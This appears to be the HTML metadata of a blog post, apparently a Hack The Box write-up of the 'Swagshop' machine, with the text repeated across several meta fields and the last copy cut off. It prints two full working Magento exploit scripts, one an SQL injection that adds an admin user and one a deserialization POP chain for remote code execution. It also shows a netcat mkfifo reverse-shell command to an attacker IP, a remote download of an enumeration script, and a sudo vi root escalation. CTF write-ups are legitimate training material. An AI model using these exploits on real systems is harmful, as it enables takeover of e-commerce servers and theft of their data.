<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Swagshop" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="This machine was not my first Linux machine but I had fun rooted this machine ! :D Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.140 swagshop.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 $ nmap -sS swagshop.htb -p 1-65535 -T4 Nmap scan report for swagshop.htb (10.10.10.140) Host is up (0.25s latency). Not shown: 64605 closed ports, 928 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 1312.66 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Magento ? After some searching, we found out that Magento is an open-source website that people can use to run their e-commerce business. Exploitation (1) Lets try to find some exploits for Magento 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ searchsploit magento ---------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ---------------------------------------------------------------------------------------- ---------------------------------------- Magento 1.2 - &#39;/app/code/core/Mage/Admin/Model/Session.php?login[&#39;Username&#39;]&#39; Cross-Sit | exploits/php/webapps/32808.txt Magento 1.2 - &#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#39; Cro | exploits/php/webapps/32809.txt Magento 1.2 - &#39;downloader/index.php&#39; Cross-Site Scripting | exploits/php/webapps/32810.txt Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File | exploits/php/webapps/39838.php Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution | exploits/php/webapps/37811.py Magento Server MAGMI Plugin - Multiple Vulnerabilities | exploits/php/webapps/35996.txt Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion | exploits/php/webapps/35052.txt Magento eCommerce - Local File Disclosure | exploits/php/webapps/19793.txt Magento eCommerce - Remote Code Execution | exploits/xml/webapps/37977.py eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection | exploits/php/webapps/38573.txt eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service) | exploits/php/webapps/38651.txt ---------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Papers: No Result The one worked was Magento eCommerce - Remote Code Execution. Below is a slightly modified version. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import requests import base64 import sys target = &quot;http://swagshop.htb/&quot; username = &quot;try&quot; password = &quot;again&quot; if not target.startswith(&quot;http&quot;): target = &quot;http://&quot; + target if target.endswith(&quot;/&quot;): target = target[:-1] target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot; q=&quot;&quot;&quot; SET @SALT = &#39;rp&#39;; SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT )); SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`, `lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;); &quot;&quot;&quot; query = q.replace(&quot;\n&quot;, &quot;&quot;).format(username=username, password=password) pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query) r = requests.post(target_url, data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;, &quot;filter&quot;: base64.b64encode(pfilter), &quot;forwarded&quot;: 1}) if r.ok: print &quot;WORKED&quot; print &quot;Check {0}/admin with creds {1}:{2}&quot;.format(target, username, password) else: print &quot;DID NOT WORK&quot; Before running the script, I checked whether http://swagshop.htb/admin/Cms_Wysiwyg/directive/index/ was a valid URL. Unfortunately, it wasn’t. Maybe we need to specify a base URL ? When browsing the website, I realised that the different page URLs were being appended to index.php. To test my theory, I browsed to http://swagshop.htb/index.php/admin and I was greeted by the the admin panel login page. So if we try appending index.php to the target variable in the script 1 target = &quot;http://swagshop.htb/index.php&quot; and running the script, 1 2 3 $ python magento.py WORKED Check http://swagshop.htb/index.php/admin with creds try:again It worked ! Lets try to login as try:again. Exploitation (2) Alright! We got an administrative account which can pretty much have access to all the features on the website. Lets try to establish a foothold on the box which requires another exploit to be used. Back to our searchploit results, there was one exploit that required us to be authenticated. 1 Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution | exploits/php/webapps/37811.py I’ve configured the script in this way: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 #!/usr/bin/python # Exploit Title: Magento CE &lt; 1.9.0.1 Post Auth RCE # Google Dork: &quot;Powered by Magento&quot; # Date: 08/18/2015 # Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com # Vendor Homepage: http://magento.com/ # Software Link: https://www.magentocommerce.com/download # Version: 1.9.0.1 and below # Tested on: Ubuntu 15 # CVE : none from hashlib import md5 import sys import re import base64 import mechanize def usage(): print &quot;Usage: python %s &lt;target&gt; &lt;argument&gt;\nExample: python %s http://localhost \&quot;uname -a\&quot;&quot; sys.exit() if len(sys.argv) != 3: usage() # Command-line args target = sys.argv[1] arg = sys.argv[2] # Config. username = &#39;try&#39; password = &#39;again&#39; php_function = &#39;system&#39; # Note: we can only pass 1 argument to the function install_date = &#39;Wed, 08 May 2019 07:23:09 +0000&#39; # This needs to be the exact date from /app/etc/local.xml # POP chain to pivot into call_user_exec payload = &#39;O:8:\&quot;Zend_Log\&quot;:1:{s:11:\&quot;\00*\00_writers\&quot;;a:2:{i:0;O:20:\&quot;Zend_Log_Writer_Mail\&quot;:4:{s:16:&#39; \ &#39;\&quot;\00*\00_eventsToMail\&quot;;a:3:{i:0;s:11:\&quot;EXTERMINATE\&quot;;i:1;s:12:\&quot;EXTERMINATE!\&quot;;i:2;s:15:\&quot;&#39; \ &#39;EXTERMINATE!!!!\&quot;;}s:22:\&quot;\00*\00_subjectPrependText\&quot;;N;s:10:\&quot;\00*\00_layout\&quot;;O:23:\&quot;&#39; \ &#39;Zend_Config_Writer_Yaml\&quot;:3:{s:15:\&quot;\00*\00_yamlEncoder\&quot;;s:%d:\&quot;%s\&quot;;s:17:\&quot;\00*\00&#39; \ &#39;_loadedSection\&quot;;N;s:10:\&quot;\00*\00_config\&quot;;O:13:\&quot;Varien_Object\&quot;:1:{s:8:\&quot;\00*\00_data\&quot;&#39; \ &#39;;s:%d:\&quot;%s\&quot;;}}s:8:\&quot;\00*\00_mail\&quot;;O:9:\&quot;Zend_Mail\&quot;:0:{}}i:1;i:2;}}&#39; % (len(php_function), php_function, len(arg), arg) # Setup the mechanize browser and options br = mechanize.Browser() #br.set_proxies({&quot;http&quot;: &quot;localhost:8080&quot;}) br.set_handle_robots(False) request = br.open(target) br.select_form(nr=0) br.form.new_control(&#39;text&#39;, &#39;login[username]&#39;, {&#39;value&#39;: username}) # Had to manually add username control. br.form.fixup() br[&#39;login[username]&#39;] = username br[&#39;login[password]&#39;] = password br.method = &quot;POST&quot; request = br.submit() content = request.read() url = re.search(&quot;ajaxBlockUrl = \&#39;(.*)\&#39;&quot;, content) url = url.group(1) key = re.search(&quot;var FORM_KEY = &#39;(.*)&#39;&quot;, content) key = key.group(1) request = br.open(url + &#39;block/tab_orders/period/7d/?isAjax=true&#39;, data=&#39;isAjax=false&amp;form_key=&#39; + key) tunnel = re.search(&quot;src=\&quot;(.*)\?ga=&quot;, request.read()) tunnel = tunnel.group(1) payload = base64.b64encode(payload) gh = md5(payload + install_date).hexdigest() exploit = tunnel + &#39;?ga=&#39; + payload + &#39;&amp;h=&#39; + gh try: request = br.open(exploit) except (mechanize.HTTPError, mechanize.URLError) as e: print e.read() For the install_date variable, it can be found in http://swagshop.htb/app/etc/local.xml. Now lets test it out with a whoami command. For the target variable, which is the first argument, it is the URL of the admin login page (http://10.10.10.140.htb/index.php/admin). Note that we cannot use the domain name swagshop.htb as we will always be redirected to 10.10.10.140 for some reason. 1 2 $ python poc.py http://10.10.10.140/index.php/admin &quot;whoami&quot; www-data Great! Now lets our listener and establish a reverse shell connection! 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... 1 $ python poc.py http://10.10.10.140/index.php/admin &quot;rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/g&quot; As expected, we caught the reverse shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.140] 39904 /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami www-data Enumeration To quickly enumerate for possible privilege escalation vectors, I will using LinEnum. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Swagshop machine: 1 2 3 4 5 6 7 8 9 10 11 12 $ wget http://10.10.14.140/LinEnum.sh --2019-09-07 05:03:29-- http://10.10.14.140/LinEnum.sh Connecting to 10.10.14.140:80... connected. HTTP request sent, awaiting response... 200 OK Length: 45651 (45K) [text/x-sh] Saving to: &#39;LinEnum.sh&#39; 0K .......... .......... .......... .......... .... 100% 82.5K=0.5s 2019-09-07 05:03:31 (82.5 KB/s) - &#39;LinEnum.sh&#39; saved [45651/45651] $ chmod 777 LinEnum.sh $ ./LinEnum.sh LinEnum.sh revealed that www-data had sudo privileges. 1 2 3 4 5 6 User www-data may run the following commands on swagshop: (root) NOPASSWD: /usr/bin/vi /var/www/html/* [+] Possible sudo pwnage! /usr/bin/vi www-data is only able to execute /usr/bin/vi on a file in /var/www/html/ as root. To read the root flag, there are actually 2 ways to go about doing this. root.txt (1) vi actually has the ability to open a shell inside it by entering :!bash. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ sudo /usr/bin/vi /var/www/html/a ~ :!bash whoami root cat /root/root.txt c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX ___ ___ /| |/|\| |\ /_| ´ |.` |_\ We are open! (Almost) | |. | | |. | Join the beta HTB Swag Store! |___|.__| https://hackthebox.store/password PS: Use root flag as password! root.txt (2) If we create a symbolic link in /var/www/html that references the root flag, we will be able to trick sudo into thinking we are simply opening a file in /var/www/html/ with vi! 1 2 3 4 5 6 7 8 9 10 11 12 $ ln -s /root/root.txt /var/www/html/root.txt $ sudo vi /var/www/html/root.txt c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX ___ ___ /| |/|\| |\ /_| ´ |.` |_\ We are open! (Almost) | |. | | |. | Join the beta HTB Swag Store! |___|.__| https://hackthebox.store/password PS: Use root flag as password! Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="This machine was not my first Linux machine but I had fun rooted this machine ! :D Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.140 swagshop.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 $ nmap -sS swagshop.htb -p 1-65535 -T4 Nmap scan report for swagshop.htb (10.10.10.140) Host is up (0.25s latency). Not shown: 64605 closed ports, 928 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 1312.66 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Magento ? After some searching, we found out that Magento is an open-source website that people can use to run their e-commerce business. Exploitation (1) Lets try to find some exploits for Magento 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ searchsploit magento ---------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ---------------------------------------------------------------------------------------- ---------------------------------------- Magento 1.2 - &#39;/app/code/core/Mage/Admin/Model/Session.php?login[&#39;Username&#39;]&#39; Cross-Sit | exploits/php/webapps/32808.txt Magento 1.2 - &#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#39; Cro | exploits/php/webapps/32809.txt Magento 1.2 - &#39;downloader/index.php&#39; Cross-Site Scripting | exploits/php/webapps/32810.txt Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File | exploits/php/webapps/39838.php Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution | exploits/php/webapps/37811.py Magento Server MAGMI Plugin - Multiple Vulnerabilities | exploits/php/webapps/35996.txt Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion | exploits/php/webapps/35052.txt Magento eCommerce - Local File Disclosure | exploits/php/webapps/19793.txt Magento eCommerce - Remote Code Execution | exploits/xml/webapps/37977.py eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection | exploits/php/webapps/38573.txt eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service) | exploits/php/webapps/38651.txt ---------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Papers: No Result The one worked was Magento eCommerce - Remote Code Execution. Below is a slightly modified version. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import requests import base64 import sys target = &quot;http://swagshop.htb/&quot; username = &quot;try&quot; password = &quot;again&quot; if not target.startswith(&quot;http&quot;): target = &quot;http://&quot; + target if target.endswith(&quot;/&quot;): target = target[:-1] target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot; q=&quot;&quot;&quot; SET @SALT = &#39;rp&#39;; SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT )); SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`, `lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;); &quot;&quot;&quot; query = q.replace(&quot;\n&quot;, &quot;&quot;).format(username=username, password=password) pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query) r = requests.post(target_url, data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;, &quot;filter&quot;: base64.b64encode(pfilter), &quot;forwarded&quot;: 1}) if r.ok: print &quot;WORKED&quot; print &quot;Check {0}/admin with creds {1}:{2}&quot;.format(target, username, password) else: print &quot;DID NOT WORK&quot; Before running the script, I checked whether http://swagshop.htb/admin/Cms_Wysiwyg/directive/index/ was a valid URL. Unfortunately, it wasn’t. Maybe we need to specify a base URL ? When browsing the website, I realised that the different page URLs were being appended to index.php. To test my theory, I browsed to http://swagshop.htb/index.php/admin and I was greeted by the the admin panel login page. So if we try appending index.php to the target variable in the script 1 target = &quot;http://swagshop.htb/index.php&quot; and running the script, 1 2 3 $ python magento.py WORKED Check http://swagshop.htb/index.php/admin with creds try:again It worked ! Lets try to login as try:again. Exploitation (2) Alright! We got an administrative account which can pretty much have access to all the features on the website. Lets try to establish a foothold on the box which requires another exploit to be used. Back to our searchploit results, there was one exploit that required us to be authenticated. 1 Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution | exploits/php/webapps/37811.py I’ve configured the script in this way: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 #!/usr/bin/python # Exploit Title: Magento CE &lt; 1.9.0.1 Post Auth RCE # Google Dork: &quot;Powered by Magento&quot; # Date: 08/18/2015 # Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com # Vendor Homepage: http://magento.com/ # Software Link: https://www.magentocommerce.com/download # Version: 1.9.0.1 and below # Tested on: Ubuntu 15 # CVE : none from hashlib import md5 import sys import re import base64 import mechanize def usage(): print &quot;Usage: python %s &lt;target&gt; &lt;argument&gt;\nExample: python %s http://localhost \&quot;uname -a\&quot;&quot; sys.exit() if len(sys.argv) != 3: usage() # Command-line args target = sys.argv[1] arg = sys.argv[2] # Config. username = &#39;try&#39; password = &#39;again&#39; php_function = &#39;system&#39; # Note: we can only pass 1 argument to the function install_date = &#39;Wed, 08 May 2019 07:23:09 +0000&#39; # This needs to be the exact date from /app/etc/local.xml # POP chain to pivot into call_user_exec payload = &#39;O:8:\&quot;Zend_Log\&quot;:1:{s:11:\&quot;\00*\00_writers\&quot;;a:2:{i:0;O:20:\&quot;Zend_Log_Writer_Mail\&quot;:4:{s:16:&#39; \ &#39;\&quot;\00*\00_eventsToMail\&quot;;a:3:{i:0;s:11:\&quot;EXTERMINATE\&quot;;i:1;s:12:\&quot;EXTERMINATE!\&quot;;i:2;s:15:\&quot;&#39; \ &#39;EXTERMINATE!!!!\&quot;;}s:22:\&quot;\00*\00_subjectPrependText\&quot;;N;s:10:\&quot;\00*\00_layout\&quot;;O:23:\&quot;&#39; \ &#39;Zend_Config_Writer_Yaml\&quot;:3:{s:15:\&quot;\00*\00_yamlEncoder\&quot;;s:%d:\&quot;%s\&quot;;s:17:\&quot;\00*\00&#39; \ &#39;_loadedSection\&quot;;N;s:10:\&quot;\00*\00_config\&quot;;O:13:\&quot;Varien_Object\&quot;:1:{s:8:\&quot;\00*\00_data\&quot;&#39; \ &#39;;s:%d:\&quot;%s\&quot;;}}s:8:\&quot;\00*\00_mail\&quot;;O:9:\&quot;Zend_Mail\&quot;:0:{}}i:1;i:2;}}&#39; % (len(php_function), php_function, len(arg), arg) # Setup the mechanize browser and options br = mechanize.Browser() #br.set_proxies({&quot;http&quot;: &quot;localhost:8080&quot;}) br.set_handle_robots(False) request = br.open(target) br.select_form(nr=0) br.form.new_control(&#39;text&#39;, &#39;login[username]&#39;, {&#39;value&#39;: username}) # Had to manually add username control. br.form.fixup() br[&#39;login[username]&#39;] = username br[&#39;login[password]&#39;] = password br.method = &quot;POST&quot; request = br.submit() content = request.read() url = re.search(&quot;ajaxBlockUrl = \&#39;(.*)\&#39;&quot;, content) url = url.group(1) key = re.search(&quot;var FORM_KEY = &#39;(.*)&#39;&quot;, content) key = key.group(1) request = br.open(url + &#39;block/tab_orders/period/7d/?isAjax=true&#39;, data=&#39;isAjax=false&amp;form_key=&#39; + key) tunnel = re.search(&quot;src=\&quot;(.*)\?ga=&quot;, request.read()) tunnel = tunnel.group(1) payload = base64.b64encode(payload) gh = md5(payload + install_date).hexdigest() exploit = tunnel + &#39;?ga=&#39; + payload + &#39;&amp;h=&#39; + gh try: request = br.open(exploit) except (mechanize.HTTPError, mechanize.URLError) as e: print e.read() For the install_date variable, it can be found in http://swagshop.htb/app/etc/local.xml. Now lets test it out with a whoami command. For the target variable, which is the first argument, it is the URL of the admin login page (http://10.10.10.140.htb/index.php/admin). Note that we cannot use the domain name swagshop.htb as we will always be redirected to 10.10.10.140 for some reason. 1 2 $ python poc.py http://10.10.10.140/index.php/admin &quot;whoami&quot; www-data Great! Now lets our listener and establish a reverse shell connection! 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... 1 $ python poc.py http://10.10.10.140/index.php/admin &quot;rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/g&quot; As expected, we caught the reverse shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.140] 39904 /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami www-data Enumeration To quickly enumerate for possible privilege escalation vectors, I will using LinEnum. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Swagshop machine: 1 2 3 4 5 6 7 8 9 10 11 12 $ wget http://10.10.14.140/LinEnum.sh --2019-09-07 05:03:29-- http://10.10.14.140/LinEnum.sh Connecting to 10.10.14.140:80... connected. HTTP request sent, awaiting response... 200 OK Length: 45651 (45K) [text/x-sh] Saving to: &#39;LinEnum.sh&#39; 0K .......... .......... .......... .......... .... 100% 82.5K=0.5s 2019-09-07 05:03:31 (82.5 KB/s) - &#39;LinEnum.sh&#39; saved [45651/45651] $ chmod 777 LinEnum.sh $ ./LinEnum.sh LinEnum.sh revealed that www-data had sudo privileges. 1 2 3 4 5 6 User www-data may run the following commands on swagshop: (root) NOPASSWD: /usr/bin/vi /var/www/html/* [+] Possible sudo pwnage! /usr/bin/vi www-data is only able to execute /usr/bin/vi on a file in /var/www/html/ as root. To read the root flag, there are actually 2 ways to go about doing this. root.txt (1) vi actually has the ability to open a shell inside it by entering :!bash. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ sudo /usr/bin/vi /var/www/html/a ~ :!bash whoami root cat /root/root.txt c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX ___ ___ /| |/|\| |\ /_| ´ |.` |_\ We are open! (Almost) | |. | | |. | Join the beta HTB Swag Store! |___|.__| https://hackthebox.store/password PS: Use root flag as password! root.txt (2) If we create a symbolic link in /var/www/html that references the root flag, we will be able to trick sudo into thinking we are simply opening a file in /var/www/html/ with vi! 1 2 3 4 5 6 7 8 9 10 11 12 $ ln -s /root/root.txt /var/www/html/root.txt $ sudo vi /var/www/html/root.txt c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX ___ ___ /| |/|\| |\ /_| ´ |.` |_\ We are open! (Almost) | |. | | |. | Join the beta HTB Swag Store! |___|.__| https://hackthebox.store/password PS: Use root flag as password! Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/swagshop-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/swagshop-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-29T10:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Swagshop" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/swagshop-htb/"},"description":"This machine was not my first Linux machine but I had fun rooted this machine ! :D Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.140 swagshop.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 $ nmap -sS swagshop.htb -p 1-65535 -T4 Nmap scan report for swagshop.htb (10.10.10.140) Host is up (0.25s latency). Not shown: 64605 closed ports, 928 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 1312.66 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Magento ? After some searching, we found out that Magento is an open-source website that people can use to run their e-commerce business. Exploitation (1) Lets try to find some exploits for Magento 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ searchsploit magento ---------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ---------------------------------------------------------------------------------------- ---------------------------------------- Magento 1.2 - &#39;/app/code/core/Mage/Admin/Model/Session.php?login[&#39;Username&#39;]&#39; Cross-Sit | exploits/php/webapps/32808.txt Magento 1.2 - &#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#39; Cro | exploits/php/webapps/32809.txt Magento 1.2 - &#39;downloader/index.php&#39; Cross-Site Scripting | exploits/php/webapps/32810.txt Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File | exploits/php/webapps/39838.php Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution | exploits/php/webapps/37811.py Magento Server MAGMI Plugin - Multiple Vulnerabilities | exploits/php/webapps/35996.txt Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion | exploits/php/webapps/35052.txt Magento eCommerce - Local File Disclosure | exploits/php/webapps/19793.txt Magento eCommerce - Remote Code Execution | exploits/xml/webapps/37977.py eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection | exploits/php/webapps/38573.txt eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service) | exploits/php/webapps/38651.txt ---------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Papers: No Result The one worked was Magento eCommerce - Remote Code Execution. Below is a slightly modified version. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import requests import base64 import sys target = &quot;http://swagshop.htb/&quot; username = &quot;try&quot; password = &quot;again&quot; if not target.startswith(&quot;http&quot;): target = &quot;http://&quot; + target if target.endswith(&quot;/&quot;): target = target[:-1] target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot; q=&quot;&quot;&quot; SET @SALT = &#39;rp&#39;; SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT )); SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`, `lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;); &quot;&quot;&quot; query = q.replace(&quot;\\n&quot;, &quot;&quot;).format(username=username, password=password) pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query) r = requests.post(target_url, data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;, &quot;filter&quot;: base64.b64encode(pfilter), &quot;forwarded&quot;: 1}) if r.ok: print &quot;WORKED&quot; print &quot;Check {0}/admin with creds {1}:{2}&quot;.format(target, username, password) else: print &quot;DID NOT WORK&quot; Before running the script, I checked whether http://swagshop.htb/admin/Cms_Wysiwyg/directive/index/ was a valid URL. Unfortunately, it wasn’t. Maybe we need to specify a base URL ? When browsing the website, I realised that the different page URLs were being appended to index.php. To test my theory, I browsed to http://swagshop.htb/index.php/admin and I was greeted by the the admin panel login page. So if we try appending index.php to the target variable in the script 1 target = &quot;http://swagshop.htb/index.php&quot; and running the script, 1 2 3 $ python magento.py WORKED Check http://swagshop.htb/index.php/admin with creds try:again It worked ! Lets try to login as try:again. Exploitation (2) Alright! We got an administrative account which can pretty much have access to all the features on the website. Lets try to establish a foothold on the box which requires another exploit to be used. Back to our searchploit results, there was one exploit that required us to be authenticated. 1 Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution | exploits/php/webapps/37811.py I’ve configured the script in this way: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 